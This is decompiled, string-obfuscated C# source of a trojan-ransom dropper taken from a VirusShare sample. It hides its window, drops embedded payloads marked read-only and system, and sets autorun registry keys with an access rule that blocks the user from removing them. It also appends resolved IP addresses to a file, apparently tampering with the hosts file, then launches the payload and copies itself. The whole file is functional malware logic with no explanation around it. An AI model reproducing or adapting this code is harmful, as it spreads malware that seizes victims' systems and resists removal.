// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Drop, Version=6.0.210.7, Culture=neutral, PublicKeyToken=null
// MVID: 11C80E45-17E4-4FE0-855B-128F5624C502
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00013-msil\HEUR-Trojan-Ransom.MSIL.PornoAsset.gen-98902c10609932a58e030b7ddefa5ef35647f1ed7402b8b73d709f77319f3520.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.AccessControl;
using System.Threading;
using System.Windows.Forms;

public sealed class \u0003 : Form
{
  private IContainer \u0002;
  private string \u0003 = Environment.GetEnvironmentVariable(\u0008.\u0002(488449690));

  public \u0003() => this.\u0002();

  protected override void Dispose(bool _param1)
  {
    if (_param1 && this.\u0002 != null)
      this.\u0002.Dispose();
    base.Dispose(_param1);
  }

  private void \u0002()
  {
    this.SuspendLayout();
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.ClientSize = new Size(10, 10);
    this.FormBorderStyle = FormBorderStyle.None;
    this.Name = \u0008.\u0002(488449779);
    this.Opacity = 0.0;
    this.ShowIcon = false;
    this.ShowInTaskbar = false;
    this.Text = \u0008.\u0002(488449679);
    this.WindowState = FormWindowState.Minimized;
    this.Load += new EventHandler(this.\u0002);
    this.ResumeLayout(false);
  }

  private void \u0002(object _param1, EventArgs _param2)
  {
    this.Hide();
    if (this.\u0002(\u0008.\u0002(488449707)))
    {
      Thread.Sleep(2000);
      if (this.\u0002(\u0008.\u0002(488449707)))
        this.Close();
    }
    if (System.IO.File.Exists(this.\u0003 + \u0008.\u0002(488449701)))
    {
      try
      {
        System.IO.File.SetAttributes(this.\u0003 + \u0008.\u0002(488449701), FileAttributes.Normal);
        System.IO.File.Delete(this.\u0003 + \u0008.\u0002(488449701));
      }
      catch
      {
      }
    }
    this.\u0003();
    this.\u0005();
    this.\u0008();
    this.\u0006();
    this.\u000E();
    try
    {
      System.IO.File.Copy(Assembly.GetExecutingAssembly().Location, this.\u0003 + \u0008.\u0002(488449601));
    }
    catch
    {
    }
    this.Close();
  }

  private bool \u0002(string _param1)
  {
    foreach (Process process in Process.GetProcesses())
    {
      if (process.ProcessName.Contains(_param1))
        return true;
    }
    return false;
  }

  private void \u0003()
  {
    try
    {
      BinaryWriter binaryWriter = new BinaryWriter((Stream) System.IO.File.Create(this.\u0003 + \u0008.\u0002(488449701)));
      binaryWriter.Write(\u0002.\u0002());
      binaryWriter.Close();
      this.\u0002(this.\u0003 + \u0008.\u0002(488449701));
    }
    catch
    {
    }
    try
    {
      BinaryWriter binaryWriter = new BinaryWriter((Stream) System.IO.File.Create(this.\u0003 + \u0008.\u0002(488449647)));
      binaryWriter.Write(\u0002.\u0003());
      binaryWriter.Close();
      this.\u0002(this.\u0003 + \u0008.\u0002(488449647));
    }
    catch
    {
    }
  }

  private void \u0005()
  {
    try
    {
      string identity = Environment.UserDomainName + \u0008.\u0002(488449653) + Environment.UserName;
      RegistrySecurity registrySecurity = new RegistrySecurity();
      registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.ExecuteKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow));
      registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.WriteKey | RegistryRights.ChangePermissions, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny));
      Registry.LocalMachine.CreateSubKey(\u0008.\u0002(488449549), RegistryKeyPermissionCheck.Default, registrySecurity).SetValue(\u0008.\u0002(488449993), (object) (this.\u0003 + \u0008.\u0002(488450008) + this.\u0003 + \u0008.\u0002(488449701)));
    }
    catch
    {
      try
      {
        Registry.LocalMachine.CreateSubKey(\u0008.\u0002(488449549)).SetValue(\u0008.\u0002(488449993), (object) (this.\u0003 + \u0008.\u0002(488450008) + this.\u0003 + \u0008.\u0002(488449701)));
      }
      catch
      {
        try
        {
          Registry.CurrentUser.CreateSubKey(\u0008.\u0002(488450042)).SetValue(\u0008.\u0002(488449966), (object) (this.\u0003 + \u0008.\u0002(488449701)));
        }
        catch
        {
        }
      }
    }
  }

  private void \u0002(string _param1)
  {
    try
    {
      System.IO.File.SetAttributes(_param1, FileAttributes.ReadOnly | FileAttributes.System);
    }
    catch
    {
    }
  }

  private void \u0008()
  {
    try
    {
      string empty = string.Empty;
      foreach (object address in Dns.GetHostEntry(\u0008.\u0002(488449865)).AddressList)
      {
        string str = address.ToString();
        StreamWriter streamWriter = new StreamWriter(this.\u0003 + \u0008.\u0002(488449887), true);
        streamWriter.WriteLine(str + \u0008.\u0002(488449917));
        streamWriter.Close();
      }
    }
    catch
    {
    }
  }

  private void \u0006()
  {
    try
    {
      Process.Start(this.\u0003 + \u0008.\u0002(488449701));
    }
    catch
    {
    }
  }

  private void \u000E()
  {
    try
    {
      Registry.LocalMachine.CreateSubKey(\u0008.\u0002(488449822)).SetValue(\u0008.\u0002(488449246), (object) \u0008.\u0002(488449262), RegistryValueKind.DWord);
    }
    catch
    {
    }
  }
}
